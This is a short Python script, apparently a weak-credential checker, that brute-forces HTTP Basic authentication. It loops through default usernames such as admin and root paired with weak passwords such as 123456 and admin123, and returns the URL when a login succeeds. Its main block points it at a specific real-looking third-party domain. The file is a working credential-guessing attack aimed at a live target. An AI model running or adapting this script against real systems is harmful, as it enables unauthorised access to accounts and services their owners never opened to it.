import time

import requests, re, urllib3, base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    targetUrl = url
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    response = requests.get(targetUrl, headers=headers, timeout=5, verify=False)
    if response.status_code == 401:
        r0 = True
    else:
        r0 = False

    total = []
    n = 0
    r1 = False
    user_list = ['admin', 'guest', 'root', 'manager', 'system']
    pass_list = ['123456', 'admin', 'guest', 'admin123', 'system', 'root', 'manager', '000000']
    for user in user_list:
        for pwd in pass_list:
            total.append((user, pwd))
    for t in total:
        username = t[0]
        password = t[1]
        k = username + ':' + password
        key = base64.b64encode(k.encode()).decode()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
            "Authorization": "Basic " + key
        }
        response = requests.get(targetUrl, headers=headers, timeout=5, verify=False)
        if response.status_code == 200:
            r1 = True
            break
        else:
            n += 1
        time.sleep(2)
    if n == len(total):
        r1 = False
    if r0 and r1:
        return targetUrl
    else:
        return False


if __name__ == '__main__':
    print(doCheck("https://dsc.aeonlife.com.cn/"))
